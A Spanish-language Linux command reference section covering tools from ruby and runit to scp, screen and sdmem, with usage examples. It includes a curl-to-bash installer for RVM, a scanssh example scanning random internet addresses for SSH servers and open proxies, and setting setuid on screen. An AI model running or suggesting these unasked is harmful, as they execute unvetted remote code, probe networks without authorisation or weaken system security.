Contiene un conjunto de programas que prueban y miden varios componentes del comportamiento del kernel en tiempo real, como la latencia del temporizador, la latencia de la señal, etc. Incluye las aplicaciones: cyclicdeadline [prueba el programador de fechas límite usando un programa estilo prueba cíclica], cyclictest [detección de latencia], deadline_test [prueba el programador de fechas límite], determine_maximum_mpps [determina los mpps máximos que la máquina puede manejar], hackbench [prueba de estrés/comparación del programador], oslat [medidas de retraso con RDTSC], pi_stress [herencia prioritaria con procesos], pip_stress [prueba de estrés para mutex de herencia de prioridad POSIX], pmqtest [ inicia pares de subprocesos y mide la latencia de la comunicación entre procesos con colas de mensajes POSIX], ptsematest [inicia dos subprocesos y mide la latencia de la comunicación entre procesos con POSIX mutex.], queuelat [programa de prueba de latencia de cola], rt-migrate-test [programa de migración de tareas en tiempo real], signaltest [software de prueba de ida y vuelta de señal], sigwaittest [inicia dos subprocesos o bifurca dos procesos y mide la latencia entre el envío y la recepción de una señal], ssdd [un rastreador que hace un montón de PTRACE_SINGLESTEP] y svsematest [inicia dos subprocesos o bifurca dos procesos y mide la latencia de los semáforos SYSV]


ruby
Lenguaje de programación orientado a objetos. Ver irb.
Instalación:
	$ curl -L https://get.rvm.io | bash -s stable --ruby
	$ source ~/.rvm/scripts/rvm
	$ rvm install 1.9.3
	$ rvm --default ruby-1.9.3
Y comprobar o añadir:
$ nano .bashrc
La linea:
	 [[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
$ ruby script.rb (ejecutar un script de ruby)
$ ruby -e "puts Dir.glob('*').count" (la opción -e permite introducir directamente código en la linea de comando. Mostrar la cantidad de archivos del presente directorio en este caso)
$ ruby -v (Versión de ruby)


runit
Colección de herramientas para proporcionar supervisión y gestión de servicios en el sistema: iniciar y detener servicios y supervisar los daemons mientras se ejecutan, enviar señales a daemons de servicio sin la necesidad de archivos pid, registro con rotación automática de archivos de registro y límites de espacio en disco. Consta de las siguientes aplicaciones: chpst [ver], cpsv, runsv [se ejecuta dentro de un directorio de servicio, donde controlará y mantendrá el servicio en ejecución. runsv se ocupa de iniciar, detener, reiniciar el servicio y también de monitorizar su estado], runsvdir [se encarga de supervisar varios servicios a la vez], sv [ver], svlogd, mk-runscript, runsvchdir, update-service, utmpset.
$ svlogd /home/USER/Documentos/ (daemon que activa la monitorización del directorio especificado)
# runsv /etc/service/nginx (si el proceso de nginx se detiene, runsv lo volverá a iniciar automáticamente)
# runsvdir /etc/service/ (todos los servicios del directorio serán supervisados automáticamente)
# update-service --add nginx (creará un enlace simbólico en /etc/service/mi_servicio, lo que hará que runit comience a gestionarlo)
# update-service --delete nginx (eliminará el enlace simbólico y runit dejará de gestionar ese servicio)
# update-service --list (servicios que están habilitados y gestionados por runit)
# utmpset add USER tty7 (añade una entrada para USER en el terminal tty7)
# utmpset delete USER tty7 (eliminar la entrada anterior)
# utmpset check (verificar si hay entradas duplicadas o inconsistentes en utmp)
# svlogd /var/log/un_servicio (que los logs se guarden en determinado directorio)
# svlogd -tt -b 10000000 -l 5 /var/log/un_servicio (rotación de logs con un límite de tamaño de 10 MB y que guarde hasta 5 archivos de logs antiguos)


runlevel
conocer el nivel de ejecución actual del sistema [gráfico, monousuario...]
$ runlevel


runlim
Herramienta que ejecuta un programa especificado y cuando se cierra, muestra en pantalla o guarda en un archivo el tiempo y el uso de la memoria y la de sus hijos basados en el sistema de archivos proc.
$ runlim -o archivo chromium (guarda los datos en "archivo")


run-parts
[debianutils]. Ejecuta todos los ejecutables que se encuentran en el directorio especificado.
$ run-parts --list --regex '.*sh$' scripts (lista todos los .sh del directorio "scripts")
$ run-parts --test --regex '^p.*sh$' scripts (lista los que se ejecutacian del directorio "scripts", que empiecen por "p" y terminen con "sh" pero no los ejecuta realmente)
$ run-parts --reverse scritps (los ejecuta en orden inverso)
$ run-parts --exit-on-error scripts (salir cuando muestre un código de salida distinto de cero)


ruplacer
Reemplazar texto en archivos o directorios.
$ ruplacer 'texto a reemplazar' 'texto de reemplazo' archivo
$ ruplacer --subvert 'texto a reemplazar' 'texto de reemplazo' directorio (en todos los archivos del directorio y dar la opción de si con mayúscula o minúscula)
$ ruplacer --no-regex 'texto viejo' 'texto nuevo' (sustitución literal)


ruptime
Muestra el estado de cada host en una red. El comando ruptime proporciona una línea de estado como tiempo de actividad para cada máquina en la red local; Estos se forman a partir de paquetes emitidos por cada host en la red una vez por minuto.
# ruptime -l (ordena la lista por el promedio de carga)
# ruptime -a (incluye a todos los usuarios. Sin esta opción, los usuarios cuyas sesiones estén inactivas una hora o más no están incluidos)
# ruptime -t (ordena por el tiempo de actividad)
# ruptime -u (ordena la lista por el número de usuarios)


rusers
Produce una salida similar a who [ver], pero para la lista de hosts o todas las máquinas de la red local. Para cada host que responde a la consulta, se imprime el nombre del host con los nombres de los usuarios actualmente conectados. El comando rusers esperará un minuto para atrapar a los que responden tarde.
# rusers (muestra unna lista de los usuarios de la red registrados en máquinas remotas)
# rusers -h (lista usuarios ordenados alfabéticamente por nombre de host)
# rusers -h oficina (produce una lista de usuarios en el host oficina)
# rusers -u (genera lista de usuarios conectados a máquinas remotas y ordenados por el número de usuarios conectados)
# rusers -i (genera lista de usuarios registrados en máquinas remotas y ordenados de acuerdo con el tiempo de inactividad de cada máquina)


rvm
Paquete de gestión para entornos ruby y las gemas de cada proycto.
$ rvm install 1.9.2 (Instalar una versión de ruby)
$ rvm requirements (Instalar dependencias)
$ rvm upgrade 1.8.7 ruby-1.8.7-p299 (Actualizar de la versión de ruby 1.8.7-p299 a la siguiente)
$ rvm --default ruby-1.9.2 (Establecer la versión de ruby por defecto)
$ rvm gemset list (Lista gemsets [ver] creados, mostrando el que está por defecto y versión)
$ rvm gemset create NOMBRE_GEMSET (Crear un gemset)
$ rvm gemset use NOMBRE_GEMSET (Utilizar un gemset)
$ rvm gemset use VERSION@NOMBRE_GEMSET (Especificar versión de ruby y el gemset a cambiar)


rwho
Produce una salida similar a who [ver], pero para todas las máquinas de la red local. La información de estado se emite una vez cada 3 minutos por cada host de la red que ejecuta el demonio rwhod. Cualquier actividad (como el inicio o el cierre de sesión de un usuario) que tenga lugar entre las emisiones no se refleja hasta la siguiente emisión.
# rwho -a (Incluye todos los usuarios. Sin este indicador, los usuarios cuyas sesiones estén inactivas una hora o más no se incluyen en el informe)


rxvt
Emulador de terminal
$ rxvt -geometry 100x40 -e links2 http://google.es
Opciones:
-geometry 100x12  (especificar medidas)
-bg red (color de fondo)
-fg white (Color de fuente)
-cr blue  (Color del cursor)
-title "Consola linux" (especificar un título)


rxvt-unicode
Emulador de terminal vt102 en color. Incluye las aplicaciones rxvt, urclock, urxvt, urxvtc, urxvtcd y urxvtd
$ urxvt
$ urclock (muestra un reloj en la pantalla)
$ urxvtd (activa el daemon que permite lanzar urxvtc)


rzip
Compresor/descompresor. Crea los comprimidos con extensión .rz
$ rzip archivo.txt (Substituye archivo.txt por archivo.txt.rz)
$ rzip -o archivo.txt -d archivo.txt.rz (Descomprimir. Imprescindible dar el nombre del archivo de salida [-o])


s
Motor de busqueda por consola que lo abre en el navegador predeterminado o en una pestaña del mismo si ya está abierto. Usa google como motor de busqueda predeterminado si no se especifica otro.
$ s -l (listar todos los sitios web donde buscar)
$ s --list-tags (Listar las etiquetas que tambien puden usarse. Por defecto en youtube)
$ s -t video queen (Buscar por una etiqueta)
$ s repositorio debian (Busqueda básica. Busca "repositorio debian")
$ s -p duckduckgo repositorio debian (especificando que lo haga con el buscador duckduckgo)
$ s -p amazon bash (buscar en Amazon "bash")
$ s -p fa lapipaplena (Lo busca en facebook)
$ s -b "midori" red had (buscar con otro navegador "red had")
$ s -b "chromium --incognito" descargar torrents (en modo incognito con chromium)
$ s -b "firefox --private-window" descargar torrents (en modo incognito con firefox)
$ s -s (abrirlo como servidor en el puerto por defecto 8080)


s5
formato de presentación de diapositivas basado completamente en XHTML, CSS y JavaScript. Con un archivo, normalmente con HTML estructurado de una forma específica, se puede ejecutar una presentación de diapositivas completa y también tener una versión para imprimir.
$ s5 new presentacion.html (crear nueva presentación a partir de un archivo html con la estructura básica de un archivo s5 con diapositivas separadas por elementos <div> con clases específicas)
$ s5 update presentacion.html (actualizar una presentación)
$ s5 serve presentacion.html (iniciar un servidor para ver la presentación en el navegador en tiempo real mientras editas)
$ s5 export presentacion.html --output=presentacion.pdf (exportar la presentación a PDF)


s6
[s6-doc]. Conjunto de programas diseñado para permitir la supervisión de procesos (también conocida como supervisión de servicios), en la línea de daemontools y runit, así como diversas operaciones sobre procesos y demonios. Su objetivo es ser una caja de herramientas para la administración de procesos y servicios de bajo nivel, proporcionando diferentes conjuntos de herramientas independientes que se pueden usar dentro o fuera del marco y que se pueden ensamblar para lograr una funcionalidad poderosa con una cantidad muy pequeña de código. La aplicación incluye: s6-accessrules-cdb-from-fs, s6-accessrules-fs-from-cdb, s6-applyuidgid, s6-cleanfifodir, s6-connlimit, s6-envdir, s6-envuidgid, s6-fdholder-daemon, s6-fdholder-delete. s6-fdholder-getdump, s6-fdholder-list, s6-fdholder-retrieve, s6-fdholder-setdump, s6-fdholder-store, s6-fdholder-transferdump, s6-fdholderd, s6-fghack, s6-ftrig-listen, s6-ftrig-listen1, s6-ftrig-notify, s6-ftrig-wait, s6-ftrigrd, s6-instance-control, s6-instance-create, s6-instance-delete, s6-instance-list, s6-instance-maker, s6-instance-status, s6-ioconnect, s6-ipcclient, s6-ipcserver, s6-ipcserver-access, s6-ipcserver-socketbinder, s6-ipcserverd, s6-log, s6-mkfifodir, s6-notifyoncheck, s6-permafailon, s6-setlock, s6-setsid, s6-setuidgid, s6-socklog, s6-softlimit, s6-sudo, s6-sudoc, s6-sudod, s6-supervise, s6-svc, s6-svdt, s6-svdt-clear, s6-svlink, s6-svlisten, s6-svlisten1, s6-svok, s6-svperms, s6-svscan, s6-svscanctl, s6-svstat, s6-svunlink, s6-svwait, s6-tai64n, s6-tai64nlocal, s6-usertree-maker, s6lockd y ucspilogd. Colocar en el navegador: file:///usr/share/doc/s6/index.html y se muestra una extensa información sobre todos los parámetros.


s-tui
[python-pip stress]. Control de la temperatura, la frecuencia, la potencia y la utilización de la CPU, escrito en Python [pip install s-tui].
# s-tui


sa
[acct]. Se utiliza para imprimir el resumen de los comandos ejecutados por los usuarios.
$ sa -a (todos)
$ sa -m (tiempo por usuarios del sistema)
$ sa -c (Imprime porcentajes para el usuario del comando, el sistema y los valores en tiempo real)


sac
Realiza la cuenta de inicio de sesión, mostrando totales por día y por usuarios. También realiza uso promedio y perfil por hora.
$ sac -d (muestra el tiempo de inicio de sesión por dia)
$ sac -p (por usuario)
$ sac -t (por tty)
$ sac -a (información promedio)
$ sac -U (por niveles de uso simultaneo)


sadf
[sysstat]. Herramienta que se utiliza para mostrar los datos recogidos con diferentes herramientas de sysstat como sar, iostat, pidstat etc y que también soporta la exportación en diferentes formatos como CSV, XML, etc. Activar sysstat::
# nano /etc/default/sysstat
Y colocar:
ENABLED="true"
# sadf -d (mostrar datos del archivo separados por punto y coma)
# sadf -d /var/log/sysstat/sa19 -- -r (indica los parámetros de memoria)
# sadf -x /var/log/sysstat/sa19 (exportar los datos a XML))


sagan
Monitor de logs del sistema. El informe en /var/log/sagan/sagan.log
# sagan -d syslog -u user (del archivo syslog y el usuario especificado)
# sagan -d malformed (de los malformados)


saidar
Aplicación para mostrar estadísticas del sistema, tales cono de la CPU, procesos, carga, memoria, intercambio, I/O de red y de discos junto con su espacio libre. Pulsar "q" para salir.
$ saidar -d 2 -c (actualización cada 2 segundos, por defecto son 3 y a color)


sakura
Terminal
# sakura -e tail -f /var/log/fail2ban (Lanzar una aplicación)
$ sakura -n 3 -c 50 -r 30 (Lanzar la terminal con 3 pestañas y 50 columnas por 30 lineas)
Algunos atajos:
	Ctrl + Shift + T (Nueva pestaña)
	Ctrl + Shift + W (Cerrar pestaña)
	Alt  + Flechas (Moverse entre las pestañas)
	Alt  + [1-9] (Ir a la pestaña numero ..)
	Ctrl + Shift + S (Mostrar barra de scroll)
	Ctrl + Shift + RePag (Scroll arriba)
	Ctrl + Shift + AvPag (Scroll abajo)
	F11 (Maximizar/minimizar la pantalla)
	Ctrl + '+' (Aumentar la medida de la letra)
	Ctrl + '-' (Disminuir la medida de la letra)


samhain
Verificar integridad y un sistema de detección de intrusiones en grandes redes basadas en UNIX.  Después de la instalación, se debe revisar primero el fichero de configuración (por defecto /etc/samhainrc), especialmente con respecto a las direcciones de red como la dirección de correo electrónico y los ficheros/directorios que se quiera comprobar. Los logs en /var/log/samhain_log
# samhain -t init -p info (inicializar la base de datos y mostrar mensajes de gravedad en la consola)
# samhain -t check -D (iniciar samhain en modo demonio para revisar el sistema en intervalos especificados en el archivo de configuración)


sane
[Scanner Access Now Easy]. Se trata de una interfaz que proporciona acceso estandarizado a cualquier hardware de escáner de imágenes rasterizadas [escáner de superficie plana, escáner de mano, cámaras de vídeo y fotográficas, captadores de fotogramas, etc]. Incluye las aplicaciones gamma4scanimage, sane-find-scanner [ver], scanimage [ver] y umax_pp.


sane-find-scanner
Herramienta para encontrar escáneres SCSI y USB incluso si no son compatibles con ningún backend SANE.
$ sane-find-scanner (forma básica)
$ sane-find-scanner -q (Imprime solo los dispositivos, sin comentarios)


sar
[sysstat]. Controlando logs. Herramienta de monitorización del rendimiento. Cubre la mayoría de las áreas del sistema:  Uso de la CPU [opción -u, por defecto],  Colas de procesos y carga del sistema [opción -q],  Estadísticas por proceso [-x [PID | ALL]],  Creación de procesos [-c] y cambios de contexto [-w],  Actividad de los dispositivos de bloque [-d] y TTY [-y],  Uso de memoria y espacio de swap [-r],  Estadísticas de memoria [-R], de paginación [-B] y de swapping [-W],  Estadísticas de interrupciones [-I]. [/var/log/sysstat/sadd .-”dd” indica el dia]
$ sar -q 10 3 (3 muestras cada 10')
$ sar -Ruy 5 2 (2 muestras cada 5')


sarg
Generador de informes html de análisis de Squid con campos para: usuarios, direcciones IP, bytes, sitios y tiempos. Algunas opciones del archivo de configuración:
# nano /etc/sarg/sarg.conf
Descomentamos o modificamos las lineas
    output_dir /var/www/html/squid-reports
    date_format e
    overwrite_report no
    resolve_ip yes
    #mail_utility mailx
    charset UTF-8
# sarg -x (lanzar la aplicación)
Aceder a los informes con el navegador en http://localhost/squid-reports


sash
Sirve como un sustituto interactivo de /bin/sh, para usar cuando este no se puede utilizar. Incluye muchas utilidades estándar como rm, kill, mkdir, chown... Si esta instalado en el sistema y por algún problema este no puedira iniciarse, es posible que lo pueda reparar usando init=/bin/sash en el indicador de inicio.
# sash (entrar en el prompt de la aplicación)
> help (muestra los comandos permitidos)
> help comando (como se usa "comando" del listado anterior)
> cd DIR (se entra en el DIR pero no lo muestra en el prompt)
> exit (salir del prompt)


sbws
Escanea la red Tor y genera archivos de lista de ancho de banda
# sbws scanner (escaner la red con la configuración por defecto)
# sbws -c ~/.sbwsrc scanner (escanera la red con un archivo especificado)
# sbws --log-level debug generate (genera el archivo v3bw en el directorio v3bw predeterminado)
# sbws cleanup (limpia los archivos v3bw anteriores en el directorio predeterminado v3bw)


sc
Hoja de cálculo
$ sc
Teclas básicas:
	Cursores (moverse entre las celdas)
	= (añadir valor numérico o formula)
	< (texto alineado a la izquierda)
	> (texto alineado a la derecha)
	\ (texto Centrado)
	e (modificar una celda de tipo numérico)
	E (modificar una celda de texto)
	x (Borrar contenido de una celda)
	P (Guardar el trabajo. Usa extensión .sc)
	Q (Salir)
	Formulas:
	= @sum(A2:C2) (Suma de las casillas A2,B2 y C2)
	= @prod(A2:B2) (Producto de A2 por B2)
	= @avg(A2:A3) (Media entre A2 y A3)
	= @count(A1:A5) (Contar las entradas no en blanco)
	Operaciones básicas:
	e A1+A4 (Sumar A1 y A4)
	e A1-A3 (Restar A3 de A1)
	e A1*A2 (Multiplicar A1 por A2)
	e A5/A2 (Dividir A5 por A2)


scalpel
Recureprar archivos borrados
Editar el archivo /etc/scalpel/scalpel.conf y descomentamos la linea de la extensión que se quiere recuperar. P.e. para un .avi seria la linea 110. Guardar y arrancar la aplicación:
# scalpel /dev/sda2 -o carpeta_recup (Se recuperará los avi de sda2 y se guardaran en carpeta_recup)


scan
[linuxtv-dvb-apps]. Sintonizar canales de TV. El directorio /usr/share/dvb/dvb-t/ contiene las zonas de cobertura de la televisión digital terrestre.
$ scan /usr/share/dvb/dvb-t/es-Rocacorba > channels.conf
Copiar el archivo creado en el directorio .vlc/ [si no existe se crea] Abrir vlc con el siguiente comando:
$ vlc .vlc/channels.conf (Bucar los canales en View/Play list)


scanadf
[sane]. Controlar dispositivos de adquisición de imágenes capaces de devolver series de imágenes, por ejemplo, de un escáner con alimentador automático de documentos [ADF].
$ scanadf -o %02d (con salida con dos dígitos [01, 02, 03...] por defecto: image-%04d [image-0001, image-0002...])


scanimage
[sane, sane-utils]. Escanear. Por defecto genera archivos tiff y pnm.
$ scanimage -L (Para conocer los datos del escaner)
$ scanimage -v -p > imagen.tiff (Ver la información que genera el progreso y redirigido a un archivo)
$ scanimage -p --mode Color --resolution 200 -l 0 -t 0 -x 190 -y 160  > imagen.pnm (Las opciones de "mode" y "resolution" los muestra el parámetro "help". Las opciones "l" y "t" indican que comenzará a escanear desde la esquina superior izquierda. Los limites de estos parámetros tambien los muestra "help". "x" e "y" indican la medida de la imagen a escanear. En este caso 190X160 mm)
$ scanimage -p | convert - imagen.png (Redirigiendo la salida a convert que pasa la imagen a png)
$ scanimage --format=png > imagen.png (escanear imagen y guardarla como png)
$ scanimage -d hpaio:/usb/psc_1100_series?serial=MY387F93QWB --format=jpg > image.jpg (con el dispositivom especificado y guardar como jpg)
$ scanimage -T (realizar un test de la imagen a escanear)
$ scanimage -A (ver todas las opciones de escaneo)


scanlogd
Detecta escaneos de puertos y escribe una línea por escaneo a través del mecanismo syslog. scanlogd solo registra escaneos de puertos. No los impide. Sólo envia información resumida al registro del sistema. Obviamente, la dirección de origen de los escaneos de puertos puede ser falsificada. No tome ninguna medida contra la fuente de los ataques a menos que haya otra evidencia disponible. Crear o  añadir al archivo:
# nano /etc/syslog.conf
La linea
daemon.alert   /var/log/alert
# systemctl restart scanlogd.service
# systemctl status scanlogd.service


scanssh
Scanea una lista de direcciones y redes en busca de servidores de protocolo SSH en ejecución y sus números de versión, así como puertos y servidores proxy abiertos.
# scanssh 192.168.0.0/24 (escaneará toda la red 192.168.0.0/24 buscando servidores SSH en ejecución)
# scanssh -n 22 192.168.0.0/24 (escaneará solo el puerto 22 en la red especificada)
# scanssh -p 192.168.0.0/24 (detectar proxies abiertos en la red especificada)
# scanssh -s ssh,socks5,http-proxy,telnet-proxy 192.168.0.0/24 (ejecutará múltiples escaneadores simultáneamente [SSH, SOCKS5, HTTP proxy y TELNET proxy] en la red especificada)
# scanssh -u socks.example.com:9050 192.168.0.0/24 (usará SOCKS proxies para escanear la red especificada)
# scanssh 'random(1000)/0.0.0.0/0' (escaneará aleatoriamente 1000 direcciones en la red 0.0.0.0/0)
# scanssh 192.168.18.0/24 -I -r 3 (sin cadena de identificación ssh y 3 pruebas por segundo


schroot
Parecido a un chroot [ver] que se ha de usar como root, pero para usuarios normales. schroot permite el acceso a chroots para usuarios normales que utilizan el mismo mecanismo, pero con la comprobación de permisos y permite la configuración automática adicional del entorno chroot, como el montaje de sistemas de archivos adicionales y otras tareas de configuración.


scout_realtime
[rubygems]. Herramienta para monitorizar métricas del servidor Linux, ya sea en local o remoto via web. Muestra gráficos de la CPU, memoria, disco, red y procesos. Al ser una aplicación en Ruby ha de instalarse:
# gem install scout_realtime
# scout_realtime (Lanzar el daemon)
Abrir el navegador y colocar:
	http://localhost:5555
# scout_realtime stop (detener el daemon)
Si el monitoreo se realiza en remoto, ha de abrirse el puerto 5555 de la maquina a monitorizar. Visualizar los logs:
$ cat .scout/scout_realtime.log


scp
Copiar o transferir archivos o directorios entre una máquina remota y una local
$ scp -r textos pepe@IP: (copiará el directorio "textos" al host remoto en el directorio del usuario)
$ scp pepe@host_o_IP:/home/pepe/*.odt ./pendiente (Copiará todos los .odt del directorio /home/pepe del host remoto al directorio “pendiente” de la máquina local)
$ scp pepe@host_o_ip:Descargas/*.avi Pelis (Descargará todos los .avi del directorio "Descargas" del host remoto a la carpeta "Pelis" de la maquina local)
$ scp *.odt pepe@host_o_IP:/home/pepe/pendiente (transferirá todos los odt del directorio actual al directorio especificado “pendiente” del host remoto.)
$ scp archivo usuario@host_o_IP:/home/usuario/Desktop (copiará “archivo” en local al escritorio remoto)
$ scp -l 500 -r directorio pepe@host_o_IP:/home/usuario/Desktop (copiará el directorio al host remoto y limitando el ancho de banda a 500 Kbits/s)
$ scp -P 12000 pep@chost_o_IP:/home/usuario/archivo . (especificando un puerto en el host remoto y copiar archivo al presente directorio)
$ scp -q archivo.tar.gz usuario@host_o_IP: (Deshabilitando la salida del comando [barra de progreso y mensaje])
$ scp -Cv archivo usuario@host_o_IP: (Activando compresión de datos y mostrando más información del proceso)
$ scp -c aes128-cbc archivo.tar.gz usuario@host_o_IP: (Habilitar cifrado durante la transferencia [Cifrados posibles:3des-cbc, aes128-cbc, aes192-cbc, aes256-cbc, aes128-ctr, aes192-ctr, aes256-ctr, arcfour128,arcfour256, arcfour, blowfish-cbc y cast128-cbc])
Nota.- Si quiere transferirse al $HOME remoto o desde el $HOME remoto puede suprimirse la ruta relativa, quedando: scp archivo pepe@host_o_IP:


screen
Compartir sesiones de consola locales o remotas.
$ screen   (abre una terminal virtual genérica)
$ screen -S tux  (nombrar la sesión del que comparte consola)
	$ screen -ls (conocer los screen abiertos y sus nombres)
	There are screens on:
        19680.tux       (Attached)
        19684.xut       (Attached)
# screen /dev/ttyACM0 115200 (conectar a una consola serie. En el ejemplo se usa la conexión serie del miniordenador VoCore2 (/dev/ttyACM0) y se le especifica la velocidad de 115200 bps. Si quieres usar una tty como usuario normal debes añadir tu usuario a los grupos uucp y dialout)
2 Sockets in /tmp/screens/S-juanito.
$ screen -x 19680.tux  (el que se conecta)
$ screen -r 	Retoma el proceso desacoplado con Ctrl+a Ctrl+d
$ screen -r -S nombre	Retoma el proceso "nombre"
$ screen -R -D	Recupera screen despúes de un Ctrl+d
La gestión de screen siempre empieza pulsando las teclas Ctrl+a:
	Ctrl+a c (Crear nueva ventana)
	Ctrl+a k (Matar pantalla activa / sesion activa)
	Ctrl+a X (Matar pantalla activa)
	Ctrl+a x (Bloquear terminal)
	Ctrl+a w (Lista de ventanas)
	Ctrl+a 0-9 (Ir a la ventana numerada)
	Ctrl+a Ctrl+a (Cambiar a la última ventana)
	Ctrl+a Ctrl+p (Cambiar a la anterior ventana)
	Ctrl+a S (Dividir la terminal horizontal en regiones)
	Ctrl+a | (Dividir la terminal veticalmente)
	Ctrl+a Ctrl+n (Cambiar de región)
	Ctrl+a :resize (Redimensionar región)
	Ctrl+a F (Ajustar tamaño de la pantalla al tamaño de la nueva terminal)
	Ctrl+a K (Suprimir region)
	Ctrl+a Z (resetear screen)pi
	Ctrl+a tab (Moverse entre regiones)
	Ctrl+a d (Desacopla un proceso de una terminal, que continua en segundo plano)
	Ctrl+a ? (Mostrar pantalla de ayuda)
	Ctrl+a Backspace (Regresar a la ventana previa)
	Ctrl+q (Si se ha pulsado una combinación erronea, desbloquea la terminal)
	Ctrl+s (Lo mismo)
	Ctrl+a " (Muestra las shells activas)
	Ctrl+a A (Cambiar el título de la ventana)
	Ctrl+a Esc (Ver historial)
	Ctrl+a h (Guardar pantallazo en la carpeta actual con nombre hardcopy.número [0,1,2...])
	Ctrl+a H (Iniciar/parar registro de la ventana actual en la ventana con nombre screenlog.número [0,1,2...])
Para compartir screen via ssh:
	Activar el setuid de screen:
	# chmod +s /usr/bin/screen
	Ejecutar:
	$ screen -S nombreSesion
	Activar acceso multiusuario:
	Ctrl+a :multiuser on
	Dar permisos al usuario:
	Ctrl+a :acladd usuario
	El usuario remoto debera conectar por SSH con la máquina y ejecutar:
	$ screen -x usuario/NombreSesion
Si deseamos tener una barra inferior donde aparecerá el nombre de las diferentes ventanas y la hora actual, podemos modificar/crear el fichero de configuración ~/.screenrc con el siguiente contenido (http://www.marblestation.com/?p=915):
	# screen -t shell 0
	# screen -t shell 0 motd+shell
	# screen -t shell2    1
	# screen -t server    2
	# screen -t Mail 9   tail -f /var/log/messages
	select 0
	shelltitle "shell"
	# skip the startup message
	startup_message off
	# go to home dir
	chdir
	# Automatically detach on hangup.
	autodetach on
	# Change default scrollback value for new windows
	defscrollback 1000
	# Turns off alternate screen switching in xterms,
	# so that text in screen will go into the xterm's scrollback buffer:
	termcapinfo xterm* ti@:te@
	altscreen on
	# start with visual bell as default
	vbell on
	vbell_msg "bell on %t (%n)"
	activity "Activity in %t(%n)"
	# Run a screensaver if there's nothing happening for a while.
	#idle 600 eval "screen cmatrix -f -o -u 10" "idle 0"
	idle 600 lockscreen
	### White
	#caption always "%{kW}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{kW}%?%+Lw%? %= %{= Wk}%110`%109`%111` %H load: %l | %D %d-%m-%Y %0c:%s"
	### Black
	#caption always "%{wk}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{wk}%?%+Lw%? %= %{= kw}%110`%109`%111` %H load: %l | %D %d-%m-%Y %0c:%s"
	caption always "%{wk}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{wk}%?%+Lw%? %= %{= kw}%110`%109`%111` %H | %D %d-%m-%Y %0c:%s"


screendump
Vuelca el contenido de una consola virtual a stdout. Abrimos la consola /dev/tty1 y en ella lanzamos, por ejemplo, "htop" y en una terminal de las X lanzamos:
# screendump 1
Y nos mostrará un pantallazo de lo que ocurre en la terminal /dev/tty1


screenfetch
Muestra información del equipo. En caso de no estar en los repositorios:
$ wget -c https://raw.github.com/KittyKatt/screenFetch/master/screenfetch-dev -O screenfetch
$ ./screenfetch
$ ./screenfetch -s (Realiza una captura de pantalla)
$ ./screenfetch -n (Muestra información sin el logo)
$ ./screenfetch -c 9 -L (Que muestre solo el logo y en rojo. Colores del 0 al 9)
$ ./screenfetch -E (Excluir los parámetros que dan error, si existen)


screengrab
Capturas de pantalla del escritorio o del area seleccionada.
$ screengrab -f (de la pantalla completa)
$ screengrab -a (de la ventqana activa)
$ screengrab -r (del area que seleccionemos)


screenkey
[python-xlib]. Aplicacion que, durante una grabacion de escritorio en la que salen terminales y comandos, muestra por pantalla una franja negra en la que se puede apreciar las teclas que se pulsan para que las puedan ver mejor los televidentes. Iniciar la aplicacion (Se mostrara en el area del tray) y la grabacion del escritorio con alguna de las herramientas (gtk-recordMyDesktop, kazam, etc) y pararla con killall -9 screenkey cuando finalice la grabacion.


scribes
Editor minimalista especial para programadores.
	Algunos atajos:
	Ctrl + o (Abrir archivo)
	Ctrl + s (Guardar)
	Ctrl + Mayus + s (Renombrar)
	Ctrl + p (Imprimir)
	Ctrl + t (Indentar lineas seleccionadas)
	Ctrl + Mayus + t (Suprimir indentación)
	Alt +t (Convertir espacios en tabulaciones)
	Alt + Mayus + t (Convertir tabulaciones a espacios)
	Alt + r (Suprimir espacios al final de linea)
	Alt + d (Suprimir linea)
	Alt + F4 (Cerrar el editor)
	F1 (Abrir la ayuda)
	F12 (Abrir preferencias)


script
[scriptreplay]. Copia en un fichero toda la actividad tecleada en consola hasta cesar con "exit"
$ script -a fichero.txt
$ script -t 2> sesion.con -a sesion.vid  (grabará la sesion. Parar el proceso con crtl+d)
$ scriptreplay sesion.con sesion.vid  (reproduce la sesión grabada)
$ script -f /dev/pts/3   (redirigir hacia otra terminal)
1.-
Varias formas de ejecutar un script:
$ bash miscript.sh
$ sh miscript.sh
$ source miscript.sh
O activando el bit de ejecución en los permisos del fichero:
$ chmod +x miscript.sh
$ ./miscript.sh


scrot
Captura de pantalla
$ scrot (Con los valores por defecto)
$ scrot captura.png
$ scrot -s captura.png (Para seleccionar un área en concreto)
$ scrot -d 5 captura.png (retardar la captura 5 segundos)
$ scrot -t 50 captura.png (para reducir la captura un 50%)
$ scrot -ucd 5 (“u” captura la ventana que tiene el foco, “c” que muestre la cuenta regresiva y “d 5” los segundos de retardo)


scrounge-ntfs
Permite recuperar datos de particiones ntfs incluso corruptas.
# scrounge-ntfs -l /dev/sda  (Para vusializar los datos del disco)
La salida del comando puede ser paracida a:
Drive: /dev/sdc
63              16787862        8               6291456
16787925        471607195       8               6291456
Con estos datos lanzar:
# scrounge-ntfs -m 6291456 -c 8 /dev/sdc 16787925 471607195


sd
Como el comando sed [ver] pero simplificado. Por ejemplo con sed, substituir "mañana" por "tarde" en un archivo de texto seria:
    $ sed s/mañana/tarde/g
Y con sd se transformaría en:
    $ sd mañana tarde


sdate
Genera la "fecha eterna" contando los dias pasados des de septiembre de 1993.
$ sdate
  viernes, 11049 de setiembre de 1993, 07:47:43 CET


sdcv
Utilidad basada en texto para trabajar con diccionarios en formato StarDict.
$ sdcv -l (listar los diccionarios que se instalan)
$ sdcv palabra (Buscar "palabra" en los direccionarios)


sdf
[Simple Document Format]. Sistema de desarrollo de documentos en una variedad de formatos desde una única fuente. Los formatos de salida admitidos son PostScript, PDF, HTML, plain text, POD, man pages, LaTeX, MIF, SGML, RTF,MIMS F6 help y MIMS HTX help. Incluye las aplicaciones fm2ps, mif2rtf, pod2sdf, poddiff, prn2ps, sdf, sdfapi, sdfbatch, sdfcli, sdfget y sdngen.


sdiff
Muestra dos ficheros interactivamente.
$ sdiff -W -B file1 file2 (Ignorando espacios [W] y lineas en blanco [B])


sdmem
[secure-delete]. Diseñado para eliminar los datos que pueden permanecer en la memoria RAM de forma segura y que no puedan ser recuperados. Es preciso recordar que en las SDRAMs los datos no se borran, sino que se mantienen estáticos y por tanto es fácil extraerles la información necesaria.
# sdmem -f -v (en modo rápido [f] y verbose [v])
